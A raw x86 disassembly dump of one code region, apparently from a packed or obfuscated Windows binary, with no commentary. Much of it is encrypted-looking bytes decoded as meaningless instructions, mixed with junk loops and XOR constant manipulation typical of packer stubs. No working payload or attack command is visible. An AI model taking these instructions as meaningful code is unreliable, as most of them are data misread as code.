  40b7d4:	out    0x73,al
  40b7d6:	push   ebp
  40b7d7:	fisttp DWORD PTR [edi+0x25]
  40b7da:	or     al,0xd2
  40b7dc:	and    al,0xa
  40b7de:	push   ebp
  40b7df:	push   edx
  40b7e0:	sbb    DWORD PTR [ecx],eax
  40b7e2:	lock in al,0x90
  40b7e5:	inc    esp
  40b7e6:	jne    0x40b782
  40b7e8:	lods   al,BYTE PTR ds:[esi]
  40b7e9:	icebp  
  40b7ea:	sbb    cl,bl
  40b7ec:	xor    dl,dh
  40b7ee:	mov    bl,0xd2
  40b7f0:	sbb    al,0x24
  40b7f2:	jmp    0x40b812
  40b7f4:	lock fs (bad) 
  40b7f7:	xor    eax,0x554bfac3
  40b7fc:	mov    edx,edi
  40b7fe:	loopne 0x40b86e
  40b800:	hlt    
  40b801:	sbb    ah,BYTE PTR [ebp+eiz*8-0x78]
  40b805:	pop    ebp
  40b806:	stos   BYTE PTR es:[edi],al
  40b807:	ins    DWORD PTR es:[edi],dx
  40b808:	dec    ebp
  40b809:	inc    edi
  40b80a:	push   0x2e
  40b80c:	mov    ebp,0x7b869c47
  40b811:	sbb    DWORD PTR [edi+0x1e9439a1],0xffffffbe
  40b818:	repnz and edi,ebx
  40b81b:	std    
  40b81c:	lahf   
  40b81d:	cmp    dh,BYTE PTR [eax-0x1fb7c1be]
  40b823:	mov    gs,WORD PTR [ecx+0x2f]
  40b826:	int3   
  40b827:	pop    esp
  40b828:	sbb    DWORD PTR [eax+eax*2],edx
  40b82b:	jle    0x40b870
  40b82d:	outs   dx,BYTE PTR ds:[esi]
  40b82e:	nop
  40b82f:	into   
  40b830:	xor    al,0x38
  40b832:	lods   al,BYTE PTR ds:[esi]
  40b833:	xor    BYTE PTR [esi-0x60],bh
  40b836:	jp     0x40b7d3
  40b838:	sbb    al,0xd7
  40b83a:	xchg   edx,eax
  40b83b:	(bad)  
  40b83c:	mov    eax,ds:0xe991ce7d
  40b841:	addr16 mov dl,0xda
  40b844:	(bad)  
  40b847:	es xchg esi,eax
  40b849:	bound  esp,QWORD PTR [ebp+0x753134bb]
  40b84f:	vaddsd xmm0,xmm6,QWORD PTR [esp+ecx*8-0x21]
  40b855:	jo     0x40b848
  40b857:	rdrand edx
  40b85a:	fild   QWORD PTR [ecx-0x363d4867]
  40b860:	(bad)  
  40b861:	lock test BYTE PTR [esi],cl
  40b864:	push   ss
  40b865:	out    dx,eax
  40b866:	icebp  
  40b867:	push   ss
  40b868:	cmp    edx,DWORD PTR [esi-0x17]
  40b86b:	shr    ebx,1
  40b86d:	push   esp
  40b86e:	lods   al,BYTE PTR ds:[esi]
  40b86f:	xor    al,0x53
  40b871:	inc    eax
  40b872:	xor    BYTE PTR [esi],bl
  40b874:	mov    eax,0xd788f7da
  40b879:	jmp    0xf806:0x74c43340
  40b880:	imul   esp,ebp,0x4e
  40b883:	mov    ecx,0x50f2b70d
  40b888:	mov    al,0x12
  40b88a:	pop    esp
  40b88b:	popf   
  40b88c:	sbb    al,0x73
  40b88e:	jmp    0x57ebe1e2
  40b893:	mov    bl,0x3c
  40b895:	add    eax,0x16bf935e
  40b89a:	ins    DWORD PTR es:[edi],dx
  40b89b:	sbb    edx,DWORD PTR [esi+0x2e]
  40b89e:	sbb    BYTE PTR [eax+ecx*8-0x7d8dec98],al
  40b8a5:	shl    BYTE PTR [ecx+0x7a],1
  40b8a8:	and    al,0x88
  40b8aa:	mov    BYTE PTR [ebx-0x66750e35],dl
  40b8b0:	popa   
  40b8b1:	or     eax,0x6df0812d
  40b8b6:	pop    edx
  40b8b7:	int    0x55
  40b8b9:	(bad)  
  40b8ba:	out    dx,al
  40b8bb:	(bad)  
  40b8bc:	das    
  40b8bd:	sub    eax,0xea253f38
  40b8c2:	xchg   edi,eax
  40b8c3:	xor    eax,0x4700bc2f
  40b8c8:	mov    dl,0x9b
  40b8ca:	push   edx
  40b8cb:	adc    al,dl
  40b8cd:	sbb    BYTE PTR [bp+si],ch
  40b8d0:	nop
  40b8d1:	stc    
  40b8d2:	js     0x40b916
  40b8d4:	cwde   
  40b8d5:	test   DWORD PTR [ebx],ecx
  40b8d7:	int3   
  40b8d8:	mov    eax,ds:0x50dad88e
  40b8dd:	mov    bl,0xaf
  40b8df:	push   ds
  40b8e0:	fist   WORD PTR [eax]
  40b8e2:	imul   edx,DWORD PTR ds:0x825fa78b,0x13a70b8c
  40b8ec:	fcmove st,st(7)
  40b8ee:	xchg   BYTE PTR [ebp+0x76ffb627],dl
  40b8f4:	(bad)
  40b8f7:	rcr    ebx,cl
  40b8f9:	adc    eax,0x1bec7589
  40b8fe:	or     eax,0x430646
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430596
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43059e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4305a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ef28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ef2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ef20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	and    ch,0xc2
  40b962:	scas   al,BYTE PTR es:[edi]
  40b963:	ins    DWORD PTR es:[edi],dx
  40b964:	ds clc 
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b90d
  40b96d:	sub    BYTE PTR [esi+ebp*4+0x5d825825],bl
  40b974:	(bad)
  40b978:	and    edi,ecx
  40b97a:	mov    bl,0xec
  40b97c:	jl     0x40b982
  40b97e:	cmp    DWORD PTR [esp+ebp*4-0x37],esi
  40b982:	lods   eax,DWORD PTR ds:[esi]
  40b983:	pop    ebp
  40b984:	stc    
  40b985:	mov    ebx,0x1ee28cfc
  40b98a:	push   ds
  40b98b:	and    edi,DWORD PTR [esi]
  40b98d:	out    0xcd,eax
  40b98f:	dec    ebx
  40b990:	loopne 0x40b946
  40b992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b993:	mov    ebp,0x6cf0708
  40b998:	cli    
  40b999:	xor    ch,0x6b
  40b99c:	cmp    BYTE PTR [ebp-0x7f],bh
  40b99f:	and    ch,0xc1
  40b9a2:	fsub   DWORD PTR [ecx-0x69b91ae]
  40b9a8:	sub    al,0x1c
  40b9aa:	add    ecx,DWORD PTR [ecx]
  40b9ac:	inc    esp
  40b9ad:	retf   
  40b9ae:	ja     0x40b9ea
  40b9b0:	aaa    
  40b9b1:	cmp    BYTE PTR [esi+0x1462b90a],dh
  40b9b7:	cli    
  40b9b8:	mov    ebx,0x63b8ca7c
  40b9bd:	xchg   edi,eax
  40b9be:	hlt    
  40b9bf:	mov    ebp,0x3ffdfb89
  40b9c4:	sub    al,0xf1
  40b9c6:	mov    ds:0xf592ca0c,al
  40b9cb:	xchg   BYTE PTR [esi+0x7fb7af81],bl
  40b9d1:	rcl    BYTE PTR [edi+0x10],cl
  40b9d4:	push   esp
  40b9d5:	jle    0x40ba0e
  40b9d7:	lods   al,BYTE PTR ds:[esi]
  40b9d8:	es test eax,0xc37917ba
  40b9de:	repz mov cl,0x9b
  40b9e1:	bound  ebx,QWORD PTR [ebx+0x187465ee]
  40b9e7:	cmc    
  40b9e8:	imul   esp,DWORD PTR [edx],0xffffff97
  40b9eb:	xlat   BYTE PTR ds:[ebx]
  40b9ec:	test   DWORD PTR [edx],eax
  40b9ee:	cld    
  40b9ef:	pop    ss
  40b9f0:	(bad)  
  40b9f1:	fcomp  QWORD PTR [eax]
  40b9f3:	pusha  
  40b9f4:	mov    ch,0xa3
  40b9f6:	xor    dl,0x3d
  40b9f9:	in     al,dx
  40b9fa:	jno    0x40b98f
  40b9fc:	rcr    BYTE PTR [ecx+ecx*8+0x7f],cl
  40ba00:	stos   DWORD PTR es:[edi],eax
  40ba01:	sbb    bl,BYTE PTR ds:0x5d7f5637
  40ba07:	jge    0x40b9ec
  40ba09:	xchg   DWORD PTR [ebx-0x1e],ebp
  40ba0c:	jne    0x40b9c5
  40ba0e:	mov    fs,WORD PTR [ebx+esi*8-0x5]
  40ba12:	and    DWORD PTR [edx+0x44],esp
  40ba15:	jno    0x40ba59
  40ba17:	test   al,0xb6
  40ba19:	push   ebx
  40ba1a:	or     BYTE PTR [edx-0x492841bf],al
  40ba20:	xlat   BYTE PTR ds:[ebx]
  40ba21:	clc    
  40ba22:	scas   al,BYTE PTR es:[edi]
  40ba23:	dec    ecx
  40ba24:	sbb    DWORD PTR [ecx+0x13],0x6b261dae
  40ba2b:	(bad)  
  40ba2c:	cld    
  40ba2d:	stos   BYTE PTR es:[edi],al
  40ba2e:	pop    esp
  40ba2f:	test   BYTE PTR [ebx],0x71
  40ba32:	add    bl,BYTE PTR [ebp+0x6b17764a]
  40ba38:	test   eax,0xc93e878e
  40ba3d:	add    BYTE PTR [ebp+0x512c964e],0x8
  40ba44:	arpl   WORD PTR [esi+0x49c890d7],ax
  40ba4a:	call   0xae41958c
  40ba4f:	retf   
  40ba50:	fsub   QWORD PTR [ebx]
  40ba52:	rcl    eax,0xe2
  40ba55:	mov    eax,0x843ae92a
  40ba5a:	xchg   esp,edx
  40ba5c:	adc    BYTE PTR [ecx-0x7b],dl
  40ba5f:	mov    ecx,0xfb634114
  40ba64:	mov    cl,0x88
  40ba66:	adc    cl,BYTE PTR [ecx+0x3478993e]
  40ba6c:	in     al,dx
  40ba6d:	retf   
  40ba6e:	ret    0x686d
  40ba71:	fadd   DWORD PTR [ebx]
  40ba73:	lds    eax,FWORD PTR [ebp+0x41]
  40ba76:	rcr    DWORD PTR [eax+edi*1+0x1ca84fd],cl
  40ba7d:	xor    eax,DWORD PTR [edi+0x1f]
  40ba80:	mov    edx,0xc38262ad
  40ba85:	push   0x35
  40ba87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba88:	ffree  st(0)
  40ba8a:	add    DWORD PTR [edx+eax*4+0x1ac34117],ecx
  40ba91:	imul   esi,DWORD PTR [edi+eax*8+0x6a0295b4],0x1356121d
  40ba9c:	inc    ebx
  40ba9d:	xor    si,WORD PTR [edi]
  40baa0:	cmp    esp,DWORD PTR [eax]
  40baa2:	mov    ebx,0x7d0c34ff
  40baa7:	js     0x40ba69
  40baa9:	inc    eax
  40baaa:	sbb    ebx,edx
  40baac:	add    DWORD PTR [ebx],0xffffffc3
  40baaf:	mov    DWORD PTR ds:0x42ef20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430596,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ef28,0x42ef14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ecd4
  40bb1b:	cmp    DWORD PTR ds:0x42ef1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430656
  40bb2e:	xor    DWORD PTR ds:0x4305b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4305b2,0x43059a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	daa    
  40bb57:	sar    BYTE PTR [eax-0x23],cl
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bbd9
  40bb63:	leave  
  40bb64:	jle    0x40bbdc
  40bb66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb67:	push   edx
  40bb68:	and    edi,DWORD PTR [ebx+0x23]
  40bb6b:	jge    0x40bb18
  40bb6d:	arpl   WORD PTR [esi],ax
  40bb6f:	mov    ebx,0xcbb5377c
  40bb74:	ret    0xa72e
  40bb77:	adc    eax,0xd5d4a010
  40bb7c:	push   ecx
  40bb7d:	mov    edx,0x39e0e134
  40bb82:	(bad)  
  40bb83:	out    0x5e,al
  40bb85:	into   
  40bb86:	call   0x9aad:0xde6bcf26
  40bb8d:	sub    BYTE PTR [eax-0x13],bl
  40bb90:	lods   eax,DWORD PTR ds:[esi]
  40bb91:	fnstcw WORD PTR [edx-0xe]
  40bb94:	xchg   ecx,eax
  40bb95:	push   edx
  40bb96:	push   cs
  40bb97:	int3   
  40bb98:	jmp    0x40bc0e
  40bb9a:	jmp    0x40bb6a
  40bb9c:	(bad)  
  40bb9d:	xchg   edx,eax
  40bb9e:	ss ss push es
  40bba1:	sbb    eax,0x5083a7e3
  40bba6:	hlt    
  40bba7:	jge    0x40bbeb
  40bba9:	retf   
  40bbaa:	adc    BYTE PTR [esi-0x71eebc2a],ch
  40bbb0:	xchg   ebx,eax
  40bbb1:	call   0x2521:0xa2bf4d01
  40bbb8:	xchg   ebx,eax
  40bbb9:	(bad)
  40bbbd:	lea    ebx,[eax-0x71]
  40bbc0:	clc    
  40bbc1:	inc    ecx
  40bbc2:	in     eax,dx
  40bbc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc4:	push   cs
  40bbc5:	fild   DWORD PTR [eax-0x71245d4e]
  40bbcb:	sbb    eax,0x162afcaf
  40bbd0:	data16 aam 0x95
  40bbd3:	pop    ds
  40bbd4:	dec    ebx
  40bbd5:	lock mov ecx,0x7fd56319
  40bbdb:	mov    al,ss:0x96449e9
  40bbe1:	imul   edx,DWORD PTR [edi+0x3557593],0x3c
  40bbe8:	cmp    BYTE PTR [edx+0x666bbb18],0x50
  40bbef:	ss push esp
  40bbf1:	les    ebp,FWORD PTR [edx]
  40bbf3:	ret    
  40bbf4:	test   DWORD PTR [ecx],ebp
  40bbf6:	lahf   
  40bbf7:	loop   0x40bbd3
  40bbf9:	jne    0x40bc4b
  40bbfb:	adc    eax,DWORD PTR [esi+0x64]
  40bbfe:	cmp    DWORD PTR [ecx+0xaf283a3],0xfb7b4c76
  40bc08:	xchg   edi,eax
  40bc09:	enter  0x67ab,0x2d
  40bc0d:	mov    ebp,DWORD PTR [edi-0x33f9118c]
  40bc13:	or     dh,ah
  40bc15:	pop    es
  40bc16:	mov    ebp,0xb382c51a
  40bc1b:	mov    cl,bh
  40bc1d:	pop    edx
  40bc1e:	fiadd  DWORD PTR [ebx+eiz*1+0x24eb9baa]
  40bc25:	pushf  
  40bc26:	(bad)  
  40bc27:	(bad)  [esi+edi*8+0x55]
  40bc2b:	sbb    eax,0xaf830ec0
  40bc30:	int3   
  40bc31:	shl    BYTE PTR ds:0x75d8bd24,cl
  40bc37:	cmp    BYTE PTR [edi],0x3f
  40bc3a:	push   ebp
  40bc3b:	cmc    
  40bc3c:	add    cl,BYTE PTR [eax+0x7a]
  40bc3f:	jne    0x40bc15
  40bc41:	hlt    
  40bc42:	jo     0x40bc56
  40bc44:	dec    ebp
  40bc45:	xlat   BYTE PTR ds:[ebx]
  40bc46:	cli    
  40bc47:	cmp    edx,DWORD PTR [esi]
  40bc49:	rcl    DWORD PTR [ecx-0xb],1
  40bc4c:	aam    0xf5
  40bc4e:	pop    edx
  40bc4f:	and    al,0xd8
  40bc51:	stos   BYTE PTR es:[edi],al
  40bc52:	pusha  
  40bc53:	(bad)
  40bc57:	add    ebx,DWORD PTR [esi+0x7]
  40bc5a:	add    BYTE PTR [ebp*4-0x5faa74d6],0x5
  40bc62:	cmp    DWORD PTR [ebp+ebp*4+0x26b983c1],ebx
  40bc69:	inc    edx
  40bc6a:	(bad)
  40bc6d:	pusha  
  40bc6e:	and    al,0xd3
  40bc70:	clc    
  40bc71:	sbb    dl,BYTE PTR [ebx]
  40bc73:	sub    DWORD PTR [edx+0xd],esi
  40bc76:	les    ebx,FWORD PTR [edi+0x10]
  40bc79:	pop    edi
  40bc7a:	jp     0x40bbff
  40bc7c:	js     0x40bca5
  40bc7e:	xor    al,0x6
  40bc80:	xchg   esp,eax
  40bc81:	push   0xffffffe1
  40bc83:	cmp    BYTE PTR [edx],cl
  40bc85:	xchg   ebx,eax
  40bc86:	outs   dx,BYTE PTR ds:[esi]
  40bc87:	test   eax,0x3d3f9978
  40bc8c:	or     BYTE PTR [ebp-0x37],0x41
  40bc90:	pop    ecx
  40bc91:	bound  esi,QWORD PTR [esp+ebp*2]
  40bc94:	sar    bl,cl
  40bc96:	mov    ebp,0x6d0b08f0
  40bc9b:	in     al,dx
  40bc9c:	aas    
  40bc9d:	or     al,0xdf
  40bc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca0:	outs   dx,BYTE PTR ds:[esi]
  40bca1:	clc    
  40bca2:	push   0xc83bc303
  40bca7:	mov    DWORD PTR ds:0x430652,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43064e,0x42ef30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4305be,0x430646
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4305c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4305c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4305c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4305c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4305c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4305a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42eb2c
  40bd1f:	cmp    DWORD PTR ds:0x4305c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4305c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4305c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e872,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430596
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43065a,0x430652
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4305b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4305b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4305b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42eb30
  40bdad:	mov    ecx,DWORD PTR ds:0x4305b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4305b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43065a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	xchg   ebp,eax
  40bddd:	vmwrite ecx,DWORD PTR [edi+0x7e7efab0]
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be43
  40bde9:	xchg   BYTE PTR [ebp-0x56dd2683],cl
  40bdef:	call   0x69e1:0xf4b49596
  40bdf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf7:	test   al,0x46
  40bdf9:	sbb    BYTE PTR es:[edx+0x6aa22dbe],cl
  40be00:	mov    cl,0x59
  40be02:	mov    fs,WORD PTR [edx-0x2451a4df]
  40be08:	mov    dh,0x55
  40be0a:	dec    edi
  40be0b:	lods   al,BYTE PTR ds:[esi]
  40be0c:	je     0x40be63
  40be0e:	popf   
  40be0f:	add    BYTE PTR [edx+0x9],0xd4
  40be13:	ins    DWORD PTR es:[edi],dx
  40be14:	imul   edi,DWORD PTR [eax+ebx*4+0x56],0x7c4e5761
  40be1c:	enter  0x8037,0xeb
  40be20:	fs ins DWORD PTR es:[edi],dx
  40be22:	fcom   QWORD PTR [ebx+0x38bbddc9]
  40be28:	fist   WORD PTR [ebx-0x10]
  40be2b:	xor    eax,0x9eade137
  40be30:	shl    DWORD PTR [ebx],1
  40be32:	mov    esp,0xd44c952c
  40be37:	dec    edi
  40be38:	lods   eax,DWORD PTR ds:[esi]
  40be39:	mov    ds:0xf32c9cac,al
  40be3e:	cli    
  40be3f:	dec    edx
  40be40:	stc    
  40be41:	popa   
  40be42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be43:	mov    ecx,0xba49fa77
  40be48:	sub    esp,esp
  40be4a:	mov    edx,0xdb2325da
  40be4f:	jle    0x40bea9
  40be51:	hlt    
  40be52:	sbb    bh,BYTE PTR [edx]
  40be54:	sar    DWORD PTR [edi+0x13],0xac
  40be58:	out    0xc1,al
  40be5a:	sahf   
  40be5b:	loope  0x40bea5
  40be5d:	inc    esp
  40be5e:	xchg   ecx,eax
  40be5f:	in     eax,0x2e
  40be61:	lock jbe 0x40beb4
  40be64:	out    0xbe,al
  40be66:	and    DWORD PTR [edx],edx
  40be68:	idiv   DWORD PTR ds:0x315da9e4
  40be6e:	nop
  40be6f:	xchg   DWORD PTR [ecx+0x49e7af71],ebx
  40be75:	ror    DWORD PTR [edx-0x30],1
  40be78:	popa   
  40be79:	jmp    0x40be9a
  40be7b:	mul    dl
  40be7d:	in     eax,dx
  40be7e:	push   edi
  40be7f:	pop    ds
  40be80:	dec    eax
  40be81:	loopne 0x40bedc
  40be83:	ss adc al,0x6c
  40be86:	push   eax
  40be87:	lock retf 
  40be89:	pop    ds
  40be8a:	jmp    0x83614dbc
  40be8f:	loop   0x40beb4
  40be91:	cld    
  40be92:	dec    ebx
  40be93:	(bad)  ds:0x25ca048e
  40be99:	lods   eax,DWORD PTR ds:[esi]
  40be9a:	or     ch,bl
  40be9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be9d:	cmc    
  40be9e:	sar    DWORD PTR [eax+0x56e176c0],1
  40bea4:	outs   dx,BYTE PTR ds:[esi]
  40bea5:	(bad)
  40beaa:	pop    eax
  40beab:	sahf   
  40beac:	les    ecx,FWORD PTR [esi+eiz*1-0x78]
  40beb0:	xlat   BYTE PTR ds:[ebx]
  40beb1:	repnz cmp bh,BYTE PTR [ecx+0x58e80798]
  40beb8:	das    
  40beb9:	adc    eax,0xb174d97b
  40bebe:	jmp    0x94a9a829
  40bec3:	scas   al,BYTE PTR es:[edi]
  40bec4:	aad    0xbf
  40bec6:	rcr    BYTE PTR [esi+0x4e0fffa],1
  40becc:	ins    DWORD PTR es:[edi],dx
  40becd:	out    dx,eax
  40bece:	test   BYTE PTR fs:[esi],al
  40bed1:	sahf   
  40bed2:	scas   eax,DWORD PTR es:[edi]
  40bed3:	sub    edx,esp
  40bed5:	nop
  40bed6:	stos   DWORD PTR es:[edi],eax
  40bed7:	or     DWORD PTR [ebx+0x2d],0x941b4b5
  40bede:	lds    esp,FWORD PTR [eax-0x5a573857]
  40bee4:	(bad)
  40bee8:	nop
  40bee9:	jne    0x40be80
  40beeb:	inc    ecx
  40beec:	cmp    al,0x3f
  40beee:	dec    esi
  40beef:	imul   ecx,DWORD PTR [ebp-0x42],0x5cb0b20b
  40bef6:	mov    ecx,0x4d107986
  40befb:	pop    esp
  40befc:	ins    BYTE PTR es:[edi],dx
  40befd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40befe:	loopne 0x40be92
  40bf00:	and    ebx,DWORD PTR [edx+0x115c1862]
  40bf06:	fst    QWORD PTR [ebx-0x6a01e6df]
  40bf0c:	pop    ss
  40bf0d:	xor    BYTE PTR ss:[esi+0x4a],ch
  40bf11:	xchg   BYTE PTR [ecx-0x6ff8e2d4],al
  40bf17:	test   eax,0xd511c958
  40bf1c:	dec    ecx
  40bf1d:	xor    esi,edi
  40bf1f:	icebp  
  40bf20:	int3   
  40bf21:	inc    ebx
  40bf22:	pop    eax
  40bf23:	or     bl,dh
  40bf25:	xchg   esi,eax
  40bf26:	stc    
  40bf27:	retf   
  40bf28:	xchg   esp,eax
  40bf29:	mov    eax,DWORD PTR [ebp-0x14]
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x4305a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	add    bh,bh
  40bf4c:	mov    eax,0x7efc71a7
  40bf51:	jle    0x40bf92
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf26
  40bf57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf58:	loope  0x40bfb5
  40bf5a:	jl     0x40bf9a
  40bf5c:	dec    esi
  40bf5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf5e:	mov    al,ds:0x20f8df2
  40bf63:	adc    esp,DWORD PTR [ebx+0x2c6f299d]
  40bf69:	loopne 0x40bfd6
  40bf6b:	mov    cl,0xcc
  40bf6d:	jmp    0x40bf57
  40bf6f:	retf   0xb6e
  40bf72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf73:	xor    al,0xd5
  40bf75:	mov    ebp,0x34078e2d
  40bf7a:	sub    ah,bl
  40bf7c:	mov    cl,0x23
  40bf7e:	xlat   BYTE PTR ds:[ebx]
  40bf7f:	sbb    edx,edx
  40bf81:	cmp    BYTE PTR [edi-0x49c3fc7d],0x24
  40bf88:	and    DWORD PTR [edx-0x7cb0c5c3],eax
  40bf8e:	cmc    
  40bf8f:	mov    ebp,0xab70268c
  40bf94:	push   ebx
  40bf95:	sahf   
  40bf96:	test   al,0xf8
  40bf98:	sbb    al,0x5e
  40bf9a:	mov    bl,BYTE PTR [esi-0x7806005]
  40bfa0:	or     DWORD PTR [ecx],ebx
  40bfa2:	inc    ecx
  40bfa3:	call   0x29e3d422
  40bfa8:	or     eax,0x856d0206
  40bfad:	loop   0x40bfbb
  40bfaf:	or     al,0x70
  40bfb1:	fs scas al,BYTE PTR es:[edi]
  40bfb3:	mov    ds:0xad7b9b3e,al
  40bfb8:	cs mov bh,0xfc
  40bfbb:	fild   WORD PTR [esp+edx*2-0x6e]
  40bfbf:	xor    ebp,DWORD PTR [esi-0x11b61453]
  40bfc5:	in     eax,0x3b
  40bfc7:	or     al,0x5a
  40bfc9:	in     al,0xcc
  40bfcb:	mov    ah,0xec
  40bfcd:	mov    bl,0x89
  40bfcf:	sahf   
  40bfd0:	fs mov bl,0xec
  40bfd3:	add    eax,0xf830e65b
  40bfd8:	pushf  
  40bfd9:	iret   
  40bfda:	pop    ss
  40bfdb:	test   al,0x92
  40bfdd:	test   al,0x23
  40bfdf:	add    DWORD PTR [esi-0x48],ebp
  40bfe2:	or     al,0x4a
  40bfe4:	fstp   QWORD PTR [edi+0x50eaf83]
  40bfea:	jae    0x40bfb7
  40bfec:	jae    0x40c045
  40bfee:	mov    eax,ds:0xfbd95346
  40bff3:	retf   
  40bff4:	or     BYTE PTR ds:0x679eda86,al
  40bffa:	arpl   WORD PTR [edx],di
  40bffc:	shl    ebx,1
  40bffe:	dec    esp
  40bfff:	sub    ebp,DWORD PTR ds:0xa741dd04
  40c005:	sbb    al,0xce
  40c007:	xchg   DWORD PTR [ecx],ebx
  40c009:	frstor [ebp+0x7f]
  40c00c:	fiadd  WORD PTR [ebp+eiz*1-0x4ebd5234]
  40c013:	push   ebx
  40c014:	mov    DWORD PTR [ecx+0x35],ecx
  40c017:	je     0x40c079
  40c019:	(bad)  
  40c01a:	loope  0x40bf9c
  40c01c:	js     0x40bfc4
